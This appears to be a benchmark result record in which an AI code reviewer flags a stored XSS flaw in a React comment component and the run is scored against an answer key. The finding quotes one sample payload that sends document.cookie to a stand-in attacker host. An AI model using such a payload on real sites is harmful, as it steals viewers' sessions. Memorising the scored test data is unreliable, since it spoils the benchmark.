@@ -1,0 +1,79 @@
+{
+  "case": "C009",
+  "pr": "C009",
+  "repo": "fixture",
+  "provider": "grok",
+  "api_base": "",
+  "model": "grok-4.5",
+  "prompt": "composed",
+  "extension": false,
+  "runtime_head": "4e469f0c6687",
+  "turns": 4,
+  "tool_calls": null,
+  "seconds": 38.3,
+  "setup_seconds": 0.0,
+  "total_seconds": 38.4,
+  "usage": {
+    "in": 16902,
+    "cache_read": 101248,
+    "cache_write": 0,
+    "out": 1546,
+    "source": "cli"
+  },
+  "cost_usd": 0.0734544,
+  "changed_files": [
+    "src/components/Comment.tsx"
+  ],
+  "findings": [
+    {
+      "path": "src/components/Comment.tsx",
+      "line": 5,
+      "severity": "critical",
+      "body": "Removing `escapeHtml` and assigning `body` directly to `dangerouslySetInnerHTML` executes attacker-controlled HTML in the viewer's session.\n\nAny comment body such as `<img src=x onerror=\"fetch('https://evil.example/?c='+document.cookie)\">` runs as soon as the component mounts. The PR frames this as community-thread rich formatting, so `body` is untrusted input by design.\n\nRestore escaping, or parse a safe subset (Markdown \u2192 React nodes, or HTML through a sanitizer like DOMPurify with an allowlist) before any `__html` assignment. Do not pass raw `body` through."
+    }
+  ],
+  "summary": "## Verdict\n\n**Do not merge** \u2014 this change introduces a straightforward stored XSS by piping unsanitized `body` into `dangerouslySetInnerHTML`.\n\n## Analysis\n\n`Comment` previously ran `body` through `escapeHtml` (ampersand / angle-bracket escaping) before assigning it to `__html`. That made the `dangerouslySetInnerHTML` path effectively plain-text-safe. This PR deletes that helper and assigns `body` raw.\n\nAny caller that passes user- or community-supplied comment text (the PR description itself says this is for a community thread) can inject markup such as `<img src=x onerror=\u2026>` or `<script>\u2026</script>`. In a React app that renders other users' comments, that is session-theft / account-takeover territory for whoever views the thread.\n\nRich formatting (bold, links) needs a deliberate path: a vetted Markdown/HTML sanitizer (e.g. DOMPurify after a tightly configured parser), or React elements built from a safe subset \u2014 never raw string \u2192 `__html`.\n\n## Release decision\n\n**Recommendation:** request-changes\n",
+  "verification": [
+    {
+      "path": "src/components/Comment.tsx",
+      "line": 5,
+      "severity_claimed": "critical",
+      "status": "verified",
+      "reason": "The PR removes escapeHtml and assigns the raw body string to dangerouslySetInnerHTML, so untrusted comment HTML executes in the viewer. Base still escaped &/< />; head does not."
+    }
+  ],
+  "refuted": [],
+  "verifier": {
+    "runs": 1,
+    "seconds": 11.791,
+    "verified": 1,
+    "refuted": 0,
+    "downgraded": 0,
+    "unverified": 0,
+    "skipped": 0,
+    "model": "grok-4.5",
+    "alias": "economy",
+    "endpoint_kind": "xai",
+    "reason": "",
+    "usage": {
+      "in": 4371,
+      "out": 347
+    },
+    "cost_usd": 0.011874
+  },
+  "score": {
+    "must_find_total": 1,
+    "must_find_hits": 1,
+    "hits": [
+      "C009-d1"
+    ],
+    "misses": [],
+    "false_positives": [],
+    "unlabelled_findings": 0,
+    "severity_matches": 1,
+    "summary_present": true,
+    "suggestion_blocks": 0,
+    "coverage_paths": 1,
+    "changed_files": 1
+  }
+}
